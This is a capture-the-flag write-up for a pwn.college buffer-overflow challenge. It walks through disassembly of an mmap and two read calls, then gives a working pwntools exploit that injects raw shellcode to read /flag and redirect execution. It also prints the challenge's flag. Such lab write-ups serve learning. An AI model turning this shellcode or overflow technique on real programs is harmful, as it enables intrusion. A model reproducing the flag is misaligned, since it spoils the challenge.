---
Platform: Pwn College
Tittle: HIjack to (Mapped) Shellcode
Date & Tme: 2026 - 09 - 07 12:05
tags:
  - Challenge
  - BufferOverflow
  - ShellcodeInjection
  - PIE
---
---
## FLAG : `pwn.college{81eMP0h7gSyINU2MdmRlKHt1nLP.dBjMzwiN4kDOyEzW}`

---
## Solution :
```shell
[*] '/challenge/binary-exploitation-hijack-to-mmap-shellcode'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

Info Functions : 
```asm
0x0000000000001260  frame_dummy
0x0000000000001269  bin_padding
0x0000000000002224  challenge
0x00000000000023dd  main
```

Check this code : 
```asm
   0x0000000000002283 <+95>:	mov    r9d,0x0
   0x0000000000002289 <+101>:	mov    r8d,0x0
   0x000000000000228f <+107>:	mov    ecx,0x22
   0x0000000000002294 <+112>:	mov    edx,0x7
   0x0000000000002299 <+117>:	mov    esi,0x1000
   0x000000000000229e <+122>:	mov    edi,0x2e732000
   0x00000000000022a3 <+127>:	call   0x1100 <mmap@plt>
```
This mean, the mmap will save any buffer to `0x2e732000` with length `0x1000`.

See this line,
```shell
   0x00000000000022a8 <+132>:	mov    QWORD PTR [rip+0x2d89],rax        # 0x5038 <shellcode>
```
This line,this line occur after mmap called, this mean `0x5038` will be the offset where mmap saved. And take a look at this section : 
```asm
   0x0000000000002304 <+224>:	mov    rax,QWORD PTR [rip+0x2d2d]        # 0x5038 <shellcode>
   0x000000000000230b <+231>:	mov    edx,0x1000
   0x0000000000002310 <+236>:	mov    rsi,rax
   0x0000000000002313 <+239>:	mov    edi,0x0
   0x0000000000002318 <+244>:	call   0x1130 <read@plt>
```
This is a read function, if we write it in C, it will be `read(0,0x2e732000,0x1000)`. This mean, it will save anything we put to the mmap location.

Next, there is a `getchar()` function just to reset. And last, another `read` function : 
```asm
   0x0000000000002380 <+348>:	mov    rdx,QWORD PTR [rbp-0x8]
   0x0000000000002384 <+352>:	lea    rax,[rbp-0x50]
   0x0000000000002388 <+356>:	mov    rsi,rax
   0x000000000000238b <+359>:	mov    edi,0x0
   0x0000000000002390 <+364>:	call   0x1130 <read@plt>
```
This one will save the buffer on `rbp-0x50` with length `0x1000`

Now, let's craft our payload : 
```python
from pwn import *
context.log_level = 'critical' #to mute any failed attemp
file = ('/challenge/binary-exploitation-hijack-to-mmap-shellcode')

mmap_addr = p64(0x2e732000)
shellcode = b'\xeb\x2f\x5f\x6a\x02\x58\x48\x31\xf6\x0f\x05\x66\x81\xec\xef\x0f\x48\x8d\x34\x24\x48\x97\x48\x31\xd2\x66\xba\xef\x0f\x48\x31\xc0\x0f\x05\x6a\x01\x5f\x48\x92\x6a\x01\x58\x0f\x05\x6a\x3c\x58\x0f\x05\xe8\xcc\xff\xff\xff\x2f\x66\x6c\x61\x67'
# Payload Building
first_read = shellcode
gets = b'\x0A'

sec_read = b'A'*0x58 # To reach the rbp & overwrite it
sec_read += mmap_addr


#Write To File?
#write('payload',payload)


# Process here
p = process(file)
p.send(first_read)
p.send(gets)
p.send(sec_read)

output = p.recvall(timeout=2)
if b'pwn' in output :
	print(output.decode('utf-8', errors='ignore'))
```

